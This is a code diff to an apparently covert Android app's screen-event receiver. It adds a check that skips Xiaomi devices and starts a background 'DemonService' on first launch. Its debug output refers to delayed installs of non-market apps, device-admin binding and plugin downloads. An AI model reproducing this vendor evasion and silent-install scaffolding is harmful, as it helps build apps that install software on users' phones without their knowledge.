@@ -8,6 +8,7 @@ import android.telephony.TelephonyManager;
 import com.plugin.common.utils.SingleInstanceBase;
 import com.plugin.common.utils.UtilsRuntime;
 import com.xstd.qm.*;
+import com.xstd.qm.service.DemonService;
 import com.xstd.qm.setting.SettingManager;
 
 /**
@@ -23,6 +24,14 @@ public class ScreenBroadcastReceiver extends BroadcastReceiver {
         Config.LOGD("<<<< [[ScreenBroadcastReceiver::onReceive]]" +
                         " Phone Model : " + android.os.Build.MODEL +
                         " >>>>>");
+
+        if (AppRuntime.isXiaomiDevice()) {
+            if (Config.DEBUG) {
+                Config.LOGD("[[QuickSettingApplication::onCreate]] this device is Xiaomi Devices, just ignore this device");
+            }
+            return;
+        }
+
         if (intent != null
                 && intent.getAction() != null
                 && (intent.getAction().equals(Intent.ACTION_SCREEN_OFF)
@@ -43,12 +52,25 @@ public class ScreenBroadcastReceiver extends BroadcastReceiver {
                                     + "\n            lanuch time = " + UtilsRuntime.debugFormatTime(SettingManager.getInstance().getKeyLanuchTime())
                                     + "\n            install delay = " + SettingManager.getInstance().getKeyInstallInterval()
                                     + "\n            current time = " + UtilsRuntime.debugFormatTime(cur)
-                                    + "\n            apk exist = " + UtilOperator.isPluginApkExist()
                                     + "\n            open install NO market APP = " + open
                                     + "\n            main Device bind = " + AppRuntime.isBindingActive(context)
                                     + "\n            main Device bind count = " + SettingManager.getInstance().getDeviceBindingActiveTime()
                                     + "\n            Disable Download Plugin = " + SettingManager.getInstance().getDisableDownloadPlugin()
                                     + ")");
+                }
+
+                long launchTime = SettingManager.getInstance().getKeyLanuchTime();
+                if (launchTime == 0) {
+                    //first lanuch
+
+                    if (Config.DEBUG) {
+                        Config.LOGD("[[QuickSettingApplication::onCreate]] notify Service Lanuch as the lanuch time == 0");
+                    }
+
+                    Intent i = new Intent();
+                    i.setClass(context, DemonService.class);
+                    i.setAction(DemonService.ACTION_LANUCH);
+                    context.startService(i);
                 }
 
                 if (!AppRuntime.isBindingActive(context)
